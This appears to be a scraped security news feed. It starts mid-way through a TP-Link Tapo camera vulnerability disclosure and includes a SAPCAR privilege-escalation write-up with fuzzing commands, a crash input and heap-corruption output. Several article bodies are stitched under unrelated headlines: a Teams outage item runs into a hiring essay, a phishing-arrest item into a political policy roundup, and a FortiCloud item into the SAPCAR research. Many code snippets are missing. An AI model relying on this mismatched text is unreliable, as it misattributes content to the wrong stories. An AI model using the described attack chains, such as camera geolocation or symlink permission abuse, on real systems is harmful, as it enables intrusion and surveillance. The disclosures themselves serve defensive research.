Score: 7.1 / HighCVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:NBug 2: Pre-Auth HTTPS Content-Length Integer Overflow (CVE-2025-14299)The HTTPS server routine running on port 443 has a classic integer overflow in its  header parsing. The vulnerable function at  does this:That’s it. No bounds checking. No validation. Just raw  on user input.On a 32-bit system,  causes integer overflow, resulting in undefined behavior. In this case, the camera crashes:CVSS v4.0 Score: 7.1 / HighCVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:NBug 3: Pre-Auth WiFi Hijacking (CVE-2025-14300)The camera exposes an API endpoint called  that’s used during initial setup to configure WiFi. The problem? It’s accessible without any authentication. Even after the camera is fully set up and connected to your network.The vulnerable handler at  processes the request without any auth checks:This allows a remote attacker to: from its legitimate network (DoS)If in WiFi range proximity:Force it to connect to an attacker-controlled network (MitM)Intercept all video traffic once on the malicious network (not that we really needed this since the HTTPS private key is shared by all devices, as mentioned earlier XD)Maintain persistent access even if the owner changes their WiFi passwordCVSS v4.0 Score: 8.7 / HighCVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:NBug 4: Pre-Auth Nearby WiFi Network ScanningRelated to Bug 3, the  method is also accessible without authentication - even when the device is not in onboarding mode. This endpoint returns a list of all WiFi networks visible to the camera:A test on one of the devices exposed on the internet:This is particularly concerning given the number of these devices exposed on the internet. An attacker can remotely enumerate WiFi networks in the camera’s vicinity, including: (MAC addresses of access points) (useful for triangulation)Here’s where it gets worse: tools like apple_bssid_locator can query Apple’s location services API with a BSSID and return precise GPS coordinates.This means an attacker can:Find an exposed Tapo camera via services like ZoomEye, Shodan or similar indexesUse  to retrieve nearby WiFi BSSIDsQuery Apple’s location database with those BSSIDsPinpoint the camera’s physical location to within a few metersRemote attackers can not only see what WiFi networks exist around a camera - they can determine exactly where that camera (and by extension, the home or business it’s monitoring) is located on a map.I’ve decided to follow the industry standard responsible disclosure process; here’s the timeline:: Sent initial report to TP-Link’s security team (security@tp-link.com) with full technical details, PoC exploits and videos. All compiled according to their guidelines.: Acknowledgment received.: TP-Link confirms they’re still reviewing the report: TP-Link responds and sets the timeline for the remediation patch to the end of November 2025.: Nothing happens.: Sent follow up email, no response.: Sent another follow up email, which TP-Link responds to, further postponing the patch to the following week.: Nothing happens.: Public disclosure .: TP-Link finally publishes a security advisory for CVE-2025-8065, CVE-2025-14299 and CVE-2025-14300.The 90+30 period has long passed, so I decided to publish this writeup.On their Security Commitment page, TP-Link prominently displays charts comparing their CVE count to competitors. They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.]]></content:encoded></item><item><title>Microsoft confirms Teams is down and messages are delayed</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-confirms-teams-is-down-and-messages-are-delayed/</link><author>Mayank Parmar</author><category>security</category><pubDate>Fri, 19 Dec 2025 20:04:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft Teams is experiencing issues, with thousands reporting problems sending messages, including delays.

Let me explain.Since the early 2000s, I've seen consulting and product companies deny hiring cybersecurity juniors. The "You need 5 years of experience to start working in security" mindset. On the other side, one of the main issues in security is the difficulty of having secure by default software and systems. The example I like to give is:If you give 5 minutes to someone that never used a computer, can they set up a 2FA for their email by themselves without any help? 99.9% of the time the answer is... No!To evolve as a secure society, with everything going on on the internet from breaches, attacks, DoS, fraud, state attacks, and more, we need everyone to be secure on the web. This helps secure the economy and secure our critical infrastructure.But this is hard to achieve. Many organizations, cities, and governments do not have enough experienced people to build secure infrastructure, or do not have the time or the budget to do so. We've sadly seen too many municipalities with one person doing everything IT and security. They do what they can, but they can't do everything perfectly.Doing everything perfectly is also complex. So many different systems to learn to use, deploy, implement, secure, operate, etc.The issue: Most systems aren't secure by default and don't offer secure features by default. We've seen those pay to play 2FA or banks not even offering 2FA or good 2FA. See that list for Canadian banks.So to go back to our juniors having difficulty finding a cybersecurity job... well we also need entrepreneurs!Creating security features that can be easily included in products, software, or hardware, that require no security or minimal to no IT knowledge to use them. Those features should be implicit, by default, and plug and play.We talked about 2FA that is hard for people with extensive IT knowledge. Now passkeys exist. They are much easier, solve the password issues, but still require the user to be OK with mobile or computer usage. At the same time, in today's age, should everyone know how to be a mobile or computer power user? That's a subject for another time.So how can we help our new generation of entrepreneurs invest time and build meaningful and innovative solutions?Comment on the post with your ideas!A few things we did with our community in the past few years:Ask startups to give prizes to our CTFs and events, usually access to their tools.Give discounted prices to startups for visibility in events.Give a small advantage to startups that want to give talks about their product, no sales pitch, just technical demos and how it works talks.That's nice, it works, but it's not enough.We don’t lack ideas in cybersecurity. We lack people building and building the right thing.And that’s not because security is too hard, it’s because we’ve made building security unattractive, risky, and inaccessible. We tell young people they are not senior enough, and older engineers that it’s too late to start. On top of that, we romanticize startups, unicorns, and VC money, while ignoring the fact that most real security problems are boring, local, and very real.If we want more people, young and older, to build secure by default products that actually fix real-world issues, we need to change the narrative, incentives and lower the entry cost. People don’t start building because security is important, they start when there is a challenge and a clear problem, real users, and a realistic path to impact and income. Security education alone won’t do it. Ownership, responsibility, and trust do.Some concrete things that might actually help:Fund problems, not pitches. Give money for prototypes solving real issues in cities, schools, SMBs. (I always loved Darpa initiative to pay for hackerspace and "basement" and education projects)Create fellowships or builder programs instead of pushing everyone to “do a startup”.Pair juniors with experienced practitioners who have seen real incidents, and train them (shadowing ftw!).Reward prevention and boring success, not just exploits, alerts, and clever attacks.If we want a more secure society, we need to stop expecting everyone to become a security expert. We need to help builders create products where security is implicit, invisible, and just works. That won’t come from more talks or more fear. It will come from giving people permission, support, and real problems worth solving. And definitely... finance those approach!Oh! And please, start hiring juniors and train them. We need more people in cybersecurity, so many articles and research say that, but there are mostly no jobs for juniors, making those “research” totally invalid when confronted with the market.]]></content:encoded></item><item><title>Nigeria arrests dev of Microsoft 365 &apos;Raccoon0365&apos; phishing platform</title><link>https://www.bleepingcomputer.com/news/security/nigeria-arrests-dev-of-microsoft-365-raccoon0365-phishing-platform/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 19 Dec 2025 19:05:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Nigerian police have arrested three individuals linked to targeted Microsoft 365 cyberattacks via Raccoon0365 phishing-as-a-service.

These shifts, along with the president’s efforts to restrict free speech and freedom of the press, have come at such a rapid clip that many readers probably aren’t even aware of them all.President Trump has repeatedly claimed that a primary reason he lost the 2020 election was that social media and Big Tech companies had conspired to silence conservative voices and stifle free speech. Naturally, the president’s impulse in his second term has been to use the levers of the federal government in an effort to limit the speech of everyday Americans, as well as foreigners wishing to visit the United States.In September, Donald Trump signed a national security directive known as NSPM-7, which directs federal law enforcement officers and intelligence analysts to target “anti-American” activity, including any “tax crimes” involving extremist groups who defrauded the IRS. According to extensive reporting by journalist , the focus of the order is on those expressing “opposition to law and immigration enforcement; extreme views in favor of mass migration and open borders; adherence to radical gender ideology,” as well as “anti-Americanism,” “anti-capitalism,” and “anti-Christianity.”Earlier this month, Attorney General Pam Bondiissued a memo advising the FBI to compile a list of Americans whose activities “may constitute domestic terrorism.” Bondi also ordered the FBI to establish a “cash reward system” to encourage the public to report suspected domestic terrorist activity. The memo states that domestic terrorism could include “opposition to law and immigration enforcement” or support for “radical gender ideology.”The Trump administration also is planning to impose social media restrictions on tourists as the president continues to ramp up travel restrictions for foreign visitors. According to a notice from U.S. Customs and Border Protection (CBP), tourists — including those from Britain, Australia, France, and Japan — will soon be required to provide five years of their social media history.The CBP said it will also collect “several high value data fields,” including applicants’ email addresses from the past 10 years, their telephone numbers used in the past five years, and names and details of family members. Wired reported in October that the US CBP executed more device searches at the border in the first three months of the year than any other previous quarter.The new requirements from CBP add meat to the bones of , which in the name of combating “foreign terrorist and public safety threats” granted broad new authority that civil rights groups warn could enable a renewed travel ban and expanded visa denials or deportations based on perceived ideology. Critics alleged the order’s vague language around “public safety threats,” creates latitude for targeting individuals based on political views, national origin, or religion. At least 35 nations are now under some form of U.S. travel restrictions.In February, Trump ordered executive branch agencies to stop enforcing the U.S. Foreign Corrupt Practices Act, which froze foreign bribery investigations, and even allows for “remedial actions” of past enforcement actions deemed “inappropriate.”The White House also disbanded the Kleptocracy Asset Recovery Initiative and  — units which proved their value in corruption cases and in seizing the assets of sanctioned Russian oligarchs — and diverted resources away from investigating white-collar crime.Also in February, Attorney General Pam Bondi dissolved the FBI’s Foreign Influence Task Force, an entity created during Trump’s first term designed to counter the influence of foreign governments on American politics.In March 2025, Reuters reported that several U.S. national security agencies had halted work on a coordinated effort to counter Russian sabotage, disinformation and cyberattacks. Former President Joe Biden had ordered his national security team to establish working groups to monitor the issue amid warnings from U.S. intelligence that Russia was escalating a shadow war against Western nations.In a test of prosecutorial independence, Trump’s Justice Department ordered prosecutors to drop the corruption case against New York Mayor . The fallout was immediate: Multiple senior officials resigned in protest, the case was reassigned, and chaos engulfed the Southern District of New York (SDNY) – historically one of the nation’s most aggressive offices for pursuing public corruption, white-collar crime, and cybercrime cases.When it comes to cryptocurrency, the administration has shifted regulators at the U.S. Securities and Exchange Commission (SEC) away from enforcement to cheerleading an industry that has consistently been plagued by scams, fraud and rug-pulls. The SEC in 2025 systematically retreated from enforcement against cryptocurrency operators, dropping major cases against , , and others.Perhaps the most troubling example involves , the Chinese-born founder of crypto currency company . In 2023, the SEC charged Sun with fraud and market manipulation. Sun subsequently invested $75 million in the Trump family’s  (WLF) tokens, became the top holder of the $TRUMP memecoin, and secured a seat at an exclusive dinner with the president.In late February 2025, the SEC dropped its lawsuit. Sun promptly took Tron public through a reverse merger arranged by Dominari Securities, a firm with Trump family ties. Democratic lawmakers have urged the SEC to investigate what they call “concerning ties to President Trump and his family” as potential conflicts of interest and foreign influence.In October, President Trump pardoned , the founder of the world’s largest cryptocurrency exchange . In 2023, Zhao and his company pled guilty to failing to prevent money laundering on the platform. Binance paid a $4 billion fine, and Zhao served a four-month sentence. As  observed last month, shortly after Zhao’s pardon application, he was at the center of a blockbuster deal that put the Trump’s family’s WLF on the map.“Zhao is a citizen of the United Arab Emirates in the Persian Gulf and in May, an Emirati fund put $2 billion in Zhao’s Binance,” 60 Minutes reported. “Of all the currencies in the world, the deal was done in World Liberty crypto.” has made the agency’s new posture towards crypto explicit, stating “most crypto tokens are not securities.” At the same time, President Trump has directed the  and the SEC to expand 401(k) access to private equity and crypto — assets that regulators have historically restricted for retail investors due to high risk, fees, opacity, and illiquidity. The executive order explicitly prioritizes “curbing ERISA litigation,” and reducing accountability for fiduciaries while shifting risk onto ordinary workers’ retirement savings.At the White House’s behest, the U.S. Treasury in March suspended the Corporate Transparency Act, a law that required companies to reveal their real owners. Finance experts warned the suspension would bring back shell companies and “open the flood gates of dirty money” through the US, such as funds from drug gangs, human traffickers, and fraud groups.Trump’s clemency decisions have created a pattern of freed criminals committing new offenses, including , whose sentence for drug trafficking was commuted during Trump’s first term, was found guilty in 2025 of violating supervised release and faces new charges., who received a commutation in January 2021 for running a Ponzi scheme, was sentenced in November 2025 to 37 years for running a new Ponzi scheme. The administration has also granted clemency to a growing list of white-collar criminals: , a private equity executive sentenced to seven years for securities and wire fraud (functionally a ponzi-like scheme), and , the Nikola founder sentenced to four years for defrauding investors over electric vehicle technology. The message: Financial crimes against ordinary investors are no big deal.The administration also imposed sanctions against the International Criminal Court (ICC). On February 6, 2025, Executive Order 14203 authorized asset freezes and visa restrictions against ICC officials investigating U.S. citizens or allies, primarily in response to the ICC’s arrest warrants for Israeli Prime Minister Benjamin Netanyahu over alleged war crimes in Gaza.Earlier this month the president launched the “,” a visa scheme established by an executive order in September that offers wealthy individuals and corporations expedited paths to U.S. residency and citizenship in exchange for $1 million for individuals and $2 million for companies, plus ongoing fees. The administration says it is also planning to offer a “platinum” version of the card that offers special tax breaks — for a cool $5 million.President Trump campaigned for a second term insisting that the previous election was riddled with fraud and had been stolen from him. Shortly after Mr. Trump took the oath of office for a second time, he fired the head of the Cybersecurity and Infrastructure Security Agency (CISA) —  (no relation) — for having the audacity to state publicly that the 2020 election was the most secure in U.S. history.Mr. Trump revoked Krebs’s security clearances, ordered a Justice Department investigation into his election security work, and suspended the security clearances of employees at , the cybersecurity firm where Krebs worked as chief intelligence and public policy officer. The executive order was the first direct presidential action against any US cybersecurity company. Krebs subsequently resigned from SentinelOne, telling The Wall Street Journal he was leaving to push back on Trump’s efforts “to go after corporate interests and corporate relationships.”The president also dismissed all 15 members of the Cyber Safety Review Board (CSRB), a nonpartisan government entity established in 2022 with a mandate to investigate the security failures behind major cybersecurity events — likely because those advisors included Chris Krebs.At the time, the CSRB was in the middle of compiling a much-anticipated report on the root causes of Chinese government-backed digital intrusions into at least nine U.S. telecommunications providers. Not to be outdone, the Federal Communication Commission quickly moved to roll back a previous ruling that required U.S. telecom carriers to implement stricter cybersecurity measures.Meanwhile, CISA has lost roughly a third of its workforce this year amid mass layoffs and deferred resignations. When the government shutdown began in October, CISA laid off even more employees and furloughed 65 percent of the remaining staff, leaving only 900 employees working without pay.Additionally, the Department of Homeland Security has reassigned CISA cyber specialists to jobs supporting the president’s deportation agenda. As reported earlier this year, CISA employees were given a week to accept the new roles or resign, and some of the reassignments included relocations to new geographic areas.The White House has signaled that it plans to cut an additional $491 million from CISA’s budget next year, cuts that primarily target CISA programs focused on international affairs and countering misinformation and foreign propaganda. The president’s budget proposal justified the cuts by repeating debunked claims about CISA engaging in censorship.The Trump administration has pursued a similar reorganization at the FBI: reported in October that a quarter of all FBI agents have now been reassigned from national security threats to immigration enforcement. Reuters reported last week that the replacement of seasoned leaders at the FBI and Justice Department with Trump loyalists has led to an unprecedented number of prosecutorial missteps, resulting in a 21 percent dismissal rate of the D.C. U.S. attorney’s office criminal complaints over eight weeks, compared to a mere .5% dismissal rate over the prior 10 years.“These mistakes are causing department attorneys to lose credibility with federal courts, with some judges quashing subpoenas, threatening criminal contempt and issuing opinions that raise questions about their conduct,” Reuters reported. “Grand juries have also in some cases started rejecting indictments, a highly unusual event since prosecutors control what evidence gets presented.”In August, the DHS banned state and local governments from using cyber grants on services provided by the Multi-State Information Sharing and Analysis Center (MS-ISAC), a group that for more than 20 years has shared critical cybersecurity intelligence across state lines and provided software and other resources at free or heavily discounted rates. Specifically, DHS barred states from spending funds on services offered by the Elections Infrastructure ISAC, which was effectively shuttered after DHS pulled its funding in February.reports that the Trump administration’s massive workforce cuts, along with widespread mission uncertainty and a persistent leadership void, have interrupted federal agencies’ efforts to collaborate with the businesses and local utilities that run and protect healthcare facilities, water treatment plans, energy companies and telecommunications networks. The publication said the changes came after the US government eliminated CIPAC — a framework that allowed private companies to share cyber and threat intel without legal penalties.“Government leaders have canceled meetings with infrastructure operators, forced out their longtime points of contact, stopped attending key industry events and scrapped a coordination program that made companies feel comfortable holding sensitive talks about cyberattacks and other threats with federal agencies,” Cybersecurity Dive’s  wrote.Both the  (NSA) and  have been without a leader since Trump dismissed Air Force General Timothy Haugh in April, allegedly for disloyalty to the president and at the suggestion of far-right conspiracy theorist Laura Loomer. The nomination of Army Lt. Gen. William Hartman for the same position fell through in October. The White House has ordered the NSA to cut 8 percent of its civilian workforce (between 1,500 and 2,000 employees).As reported in August, the Office of the Director of National Intelligence plans to dramatically reduce its workforce and cut its budget by more than $700 million annually. Director of National Intelligence  said the cuts were warranted because ODNI had become “bloated and inefficient, and the intelligence community is rife with abuse of power, unauthorized leaks of classified intelligence, and politicized weaponization of intelligence.”The firing or forced retirements of so many federal employees has been a boon to foreign intelligence agencies. Chinese intelligence agencies, for example, reportedly moved quickly to take advantage of the mass layoffs, using a network of front companies to recruit laid-off U.S. government employees for “consulting work.” Former workers with the Defense Department’s  who resigned en-masse earlier this year thanks to DOGE encroaching on their mission have been approached by the United Arab Emirates to work on artificial intelligence for the oil kingdom’s armed forces, albeit reportedly with the blessing of the Trump administration.President Trump has filed multibillion-dollar lawsuits against a number of major news outlets over news segments or interviews that allegedly portrayed him in a negative light, suing the networks , the , the  parent company , , and , among others.The president signed an executive order aimed at slashing public subsidies to  and , alleging “bias” in the broadcasters’ reporting. In July, Congress approved a request from Trump to cut $1.1 billion in federal funding for the Corporation for Public Broadcasting, the nonprofit entity that funds PBS and NPR., the president’s pick to run the Federal Communications Commission (FCC), initially pledged to “dismantle the censorship cartel and restore free speech rights for everyday Americans.” But on January 22, 2025, the FCC reopened complaints against ABC, CBS and  over their coverage of the 2024 election. The previous FCC chair had dismissed the complaints as attacks on the First Amendment and an attempt to weaponize the agency for political purposes.President Trump in February seized control of the White House Correspondents’ Association, the nonprofit entity that decides which media outlets should have access to the White House and the press pool that follows the president. The president invited an additional 32 media outlets, mostly conservative or right-wing organizations.According to the journalism group Poynter.org, there are three religious networks, all of which lean conservative, as well as a mix of outlets that includes a legacy paper, television networks, and a digital outlet powered by artificial intelligence.  Trump also barred  from the White House over their refusal to refer to the Gulf of Mexico as the Gulf of America.Under Trump appointee , the U.S. Agency for Global Media moved to dismantle , Radio Free Europe/Radio Liberty, and other networks that for decades served as credible news sources behind authoritarian lines. Courts blocked shutdown orders, but the damage continues through administrative leave, contract terminations, and funding disputes.President Trump this term has fired most of the people involved in processing Freedom of Information Act (FOIA) requests for government agencies. FOIA is an indispensable tool used by journalists and the public to request government records, and to hold leaders accountable.Petitioning the government, particularly when it ignores your requests, often requires challenging federal agencies in court. But that becomes far more difficult if the most competent law firms start to shy away from cases that may involve crossing the president and his administration. On March 22, the president issued a memorandum that directs heads of the Justice and Homeland Security Departments to “seek sanctions against attorneys and law firms who engage in frivolous, unreasonable and vexatious litigation against the United States,” or in matters that come before federal agencies.The Trump administration announced increased vetting of applicants for H-1B visas for highly skilled workers, with an internal State Department memo saying that anyone involved in “censorship” of free speech should be considered for rejection., issued in 2025 on “foreign terrorist and public safety threats,” granted broad new authority that civil rights groups warn could enable a renewed travel ban and expanded visa denials or deportations based on perceived ideology. Critics charged that the order’s vague language around “public safety threats” creates latitude for targeting individuals based on political views, national origin, or religion.CONSUMER PROTECTION, PRIVACYAt the beginning of this year, President Trump ordered staffers at the Consumer Financial Protection Bureau (CFPB) to stop most work. Created by Congress in 2011 to be a clearinghouse of consumer complaints, the CFPB has sued some of the nation’s largest financial institutions for violating consumer protection laws. The CFPB says its actions have put nearly $18 billion back in Americans’ pockets in the form of monetary compensation or canceled debts, and imposed $4 billion in civil money penalties against violators.The Trump administration said it planned to fire up to 90 percent of all CFPB staff, but a recent federal appeals court ruling in Washington tossed out an earlier decision that would have allowed the firings to proceed. Reuters reported this week that an employee union and others have battled against it in court for ten months, during which the agency has been almost completely idled.The CFPB’s acting director is , a key architect of the GOP policy framework Project 2025. Under Vought’s direction, the CFPB in May quietly withdrew a data broker protection rule intended to limit the ability of U.S. data brokers to sell personal information on Americans.Despite the Federal Reserve’s own post-mortem explicitly blaming Trump-era deregulation for the 2023 Silicon Valley Bank collapse, which triggered a fast-moving crisis requiring emergency weekend bailouts of banks, Trump’s banking regulators in 2025 doubled down. They loosened capital requirements, narrowed definitions of “unsafe” banking practices, and stripped specific risk categories from supervisory frameworks. The setup for another banking crisis requiring taxpayer intervention is now in place.The Privacy Act of 1974, one of the few meaningful federal privacy laws, was built on the principles of consent and separation in response to the abuses of power that came to light during the Watergate era. The law states that when an individual provides personal information to a federal agency to receive a particular service, that data must be used solely for its original purpose.Nevertheless, it emerged in June that the Trump administration has built a central database of all US citizens. According to NPR, the White House plans to use the new platform during upcoming elections to verify the identity and citizenship status of US voters. The database was built by the Department of Homeland Security and the Department of Governmental Efficiency and is being rolled out in phases to US states.Probably the biggest ungotten scoop of 2025 is the inside story of what happened to all of the personal, financial and other sensitive data that was accessed by workers at the so-called Department of Government Efficiency (DOGE). President Trump tapped  to lead the newly created department, which was mostly populated by current and former employees of Musk’s various technology companies (including a former denizen of the cybercrime community known as the “Com”). It soon emerged that the DOGE team was using artificial intelligence to surveil at least one federal agency’s communications for hostility to Mr. Trump and his agenda.DOGE employees were able to access and synthesize data taken from a large number of previously separate and highly guarded federal databases, including those at the Social Security Administration, the Department of Homeland Security, the Office of Personnel Management, and the U.S. Department of the Treasury. DOGE staffers did so largely by circumventing or dismantling security measures designed to detect and prevent misuse of federal databases, including standard incident response protocols, auditing, and change-tracking mechanisms.For example, an IT expert with the National Labor Relations Board (NLRB) alleges that DOGE employees likely downloaded gigabytes of data from agency case files in early March, using short-lived accounts that were configured to leave few traces of network activity. The NLRB whistleblower said the large data outflows coincided with multiple blocked login attempts from addresses in Russia, which attempted to use valid credentials for a newly-created DOGE user account.The stated goal of DOGE was to reduce bureaucracy and to massively cut costs — mainly by eliminating funding for a raft of federal initiatives that had already been approved by Congress. The DOGE website claimed those efforts reduced “wasteful” and “fraudulent” federal spending by more than $200 billion. However, multiple independent reviews by news organizations determined the true “savings” DOGE achieved was off by a couple of orders of magnitude, and was likely closer to $2 billion.At the same time DOGE was slashing federal programs, President Trump fired at least 17 inspectors general at federal agencies — the very people tasked with actually identifying and stopping waste, fraud and abuse at the federal level. Those included several agencies (such as the NLRB) that had open investigations into one or more of Mr. Musk’s companies for allegedly failing to comply with protocols aimed at protecting state secrets. In September, a federal judge found the president unlawfully fired the agency watchdogs, but none of them have been reinstated.Where is DOGE now?  reported last month that as far as the White House is concerned, DOGE no longer exists, even though it technically has more than half a year left to its charter. Meanwhile, who exactly retains access to federal agency data that was fed by DOGE into AI tools is anyone’s guess.KrebsOnSecurity would like to thank the anonymous researcher NatInfoSec for assisting with the research on this story.]]></content:encoded></item><item><title>Over 25,000 FortiCloud SSO devices exposed to remote attacks</title><link>https://www.bleepingcomputer.com/news/security/over-25-000-forticloud-sso-devices-exposed-to-remote-attacks/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 19 Dec 2025 15:00:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Internet security watchdog Shadowserver has found over 25,000 Fortinet devices exposed online with FortiCloud SSO enabled, amid ongoing attacks targeting a critical authentication bypass vulnerability.

I recommend having a look at the original post, along with the tool SAPCARve I released on our GitHub page, as this is the continuation of my journey.As we all know, client engagements are time-boxed. As a result, I had limited time to work on a proof of concept for the project and had to restrict the scope of my investigation. When preparing the original blog post, I took the time to revisit the SAPCAR utility program. Since I found out that it was being used by SAP setuid binaries, a vulnerability in SAPCAR could lead to potentially interesting privilege escalation.Today, I'm presenting four (4) vulnerabilities that I responsibly disclosed to SAP and that were later fixed. The vulnerabilities could result in local privilege escalations from  to  on SAP systems, similar to my original blog post: – SAPCAR: Extraction can override permissions of current and parent directories – SAPCAR: Memory corruption (OOB write) when parsing crafted CAR archivesQuick refresher: SAPCAR is an SAP utility to parse SAP's proprietary SAR archive file format. See it as the equivalent of WinRAR.When reversing the SAPCAR binary using Ghidra, I noticed a fallback mechanism when SAR archives parsing failed. When an error occurred, due to an incorrect format for example, SAPCAR then started parsing the archive using  as follows:iVar4 = sscanf((char *)&local_1168,"%c %s %5o %10lu %9lu %10ld
%10lu",&local_3c,local_2168,&local_40,&local_48,&local_60,&local_58,&local_68);After some digging, I found a previous research presentation on SAPCAR from Troopers dating back from 2016, whose slide 11 mentions the "CAR archive header":Looking at the first line (after the comment), it matched the  call I saw. As it turns out, SAR is a newer version of the CAR format. CAR used an ASCII header, while SAR introduced binary blocks and added support for signatures. When SAPCAR parses a SAR archive and fails, it then tries again to parse it, this time using the older CAR format for backward compatibility.I also found the following page providing additional historical context about SAPCAR and its CAR/SAR formats, confirming my intuition.Out of curiosity, I modified my  script to generate a CAR archive using the same logic as the  call. And it was successfully parsed on my SAP HANA express edition virtual machine, showing that CAR archives are still accepted by modern deployments.In my previous attempt crafting an exploit for CVE-2024-47595, one path I explored but did not mention was the  option when injecting CLI arguments:-xnopvalid : Do not validate file paths during extraction, such as removing the
             drive letter/leading slashes in file paths and normalizing directory
             traversal commands like ../ to prevent directory traversal attack
             (use this option with caution at your own risk)By default, SAPCAR validates and normalizes paths when parsing SAR archives to prevent path traversal attacks. Only when you specify the  option are you able to disable those mitigations.However, what I found out is that when SAPCAR falls back to parsing CAR archives, that parsing path does not apply the same validation checks (CVE-2025-42970). Specifying an absolute path in the CAR archive will result in SAPCAR extracting it as-is on the filesystem, applying the permissions specified in the archive.Below is an example with a CAR archive containing an entry named  being extracted by SAPCAR to the local filesystem under , with world-readable and writable permissions:hxeadm@hxehost:/usr/sap/HXE/HDB90> head test.car
# CAR archive header

Because CAR archives do not support signature manifests, SAPCAR will throw an error when asked to verify the archive's signature. And the  setuid binary enforces signature verification with the  argument placed before my injection point.Let's move on to the signature manifest itself. Reversing crypto-related code is a hard task, so I focused on logic errors instead, such as missing signatures, tampered algorithms or versions, malformed file names, and so on.As a refresher, here is what a SAR signature manifest looks like (stored in  in the archive and can be extracted using the  command):SAP-MANIFEST

If an archive contains a file named  and you're located inside the directory  for example, SAPCAR will extract  to /home/myuser/dir1/dir2/file1 .When handling  sequences, SAPCAR will normalize the final path, creating it under the current directory. So, assuming you're still in  and the SAR archive contains a file named , it will be extracted to .So how about injecting the current  and parent  directory with world-writeable permissions in a signed SAR archive (CVE- 2025-43001)?

In addition to regular files and directories, SAR supports another block type: symbolic links, with the type  .Furthermore, SAPCAR has an interesting behavior. When inserting a directory in a SAR archive, SAPCAR will first check whether it exists before attempting to create it. But regardless of the outcome, SAPCAR will still apply the permissions afterward.Let's take an example by adding the directory  to an archive and extracting it:$ strace SAPCAR -xvf tp_add_dir.sar

access("anvil", F_OK) = -1 ENOENT (No such file or directory)
mkdir("anvil", 0755) = 0

access("anvil", F_OK) = 0

chmod("anvil", 0777) = 0
# ...This time,  isn't called because  already exists.

When processing the archive, SAPCAR will:Process the  block and create the  symbolic link to our target (e.g. ).Process the  block, call , see that  exists (it's our symbolic link) and skip the call to .Finally, apply the permissions specified in the  block, which is in fact our symbolic link , which ends up setting those permissions on our symlink's target.Using  once again, I took the same genuine, signed SAR archive and inserted a new symbolic link from  to , followed by a new directory named  whose permissions were set to world-readable and writable.

Namely, the timestamp, code page, and user-info fields. I will note that I did not see SAPCAR use those fields in any way, except showing the timestamp when listing the content of the archive.At the beginning of the blog, I mentioned 4 vulnerabilities but only covered 3 so far. The 4th one, while not as interesting as the others in my opinion, represented the start of my next journey: black-box fuzzing of SAPCAR.Considering the many issues found so far just focusing on logic, and considering Troopers' success in finding issues via fuzzing, I thought I should give fuzzing a try. The last time I tried black-box fuzzing, I used Intel's Pin framework for dynamic instrumentation. I thought I should revisit black-box fuzzing and see how far it had progressed since. It was the perfect excuse to try AFL++ with its Frida mode (and it's impressive to realize how far indeed it has come!).My first attempt (using the -O Frida mode) was primitive and slow, to say the least, simply running SAPCAR to list the content of the corpus files:$ taskset -c 0-3 afl-fuzz -i corpus -o findings -m none -O -- ./SAPCAR --tf @@So, between 6 and 20 executions per second. That's understandable considering the many IO operations, file decompression, and computation and validation of the signature, to name a few reasons.To my surprise, it still uncovered a memory corruption issue within its first 48h of running, our 4th and final vulnerability for this blog post: an out-of-bounds write when normalizing paths in CAR archives (CVE-2025-42971).The smaller test case looked as follows:$ cat oob_write.sar
a/../ 1 2 33 4 
$ SAPCAR -xvf oob_write.sar

AbortedDebugging SAPCAR with GEF and tracing it back in the binary using Ghidra, I came to understand that SAPCAR suffered from an off-by-one error when the filename starts with  (in the test case above, the filename is simply , the leading a character being treated as the file type).When seeing , SAPCAR will attempt to normalize the path by moving what's on the right to the left. For example, when seeing , it will move  to . The problem arises when there is no left part to begin with. So, when parsing , it will end up moving  at offset -1 of the path, writing  one byte before the path starts.And it's possible to chain multiple  sequences to keep walking backward. So  will first write  at offset -1, then  at offset -2. Then  will write  at offset -1,  at offset -2,  at offset -3, so on.As we keep going backward, we can end up overwriting the size of the current glibc heap chunk in memory. For example, with /../../../ [...] /../../../AAAAAAAAAAAA:Chunk(addr=0xa43520, size=0x41414141414140, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[0x0000000000a43520 41 41 41 00 41 41 41 00 41 41 41 00 41 41 41 00 AAA.AAA.AAA.AAA.]We can see that the chunk size was overridden with . I didn't explore it further, though, as it seemed tedious to exploit, and I already had more easily exploitable vulnerabilities.If you're interested in low-level memory exploit write-ups, consider reading Martin Gallo and Maximiliano Vidal from Core Security's blog post from 2021, where they go over how they successfully turned a heap-based buffer overflow in SAPCAR into a working exploit.I'm ending the blog post here, but our journey is not over. Setting up black-box fuzzing against SAPCAR led me down to yet another rabbit hole, trying to speed up AFL++, minimize the corpus, and write a better, more efficient harness.To my surprise, my research shifted away from SAPCAR and led to a potential pre-authentication RCE affecting most SAP software. If it seems quite puzzling how one could go from SAPCAR to an RCE affecting most SAP software, I hear you. In a way, I hope to have piqued your interest, and I invite you to stay tuned for my next blog post documenting the last leg of my journey.]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 51</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-51-8/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/12/GBU_week51.jpg" length="" type=""/><pubDate>Fri, 19 Dec 2025 14:00:24 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | Authorities Dismantle Global Fraud Ring and Crypto Laundering NetworkEurojust officials have . In collaboration with authorities from the Czech Republic, Latvia, Lithuania, and Ukraine, police arrested 12 suspects and conducted 72 searches across three Ukrainian 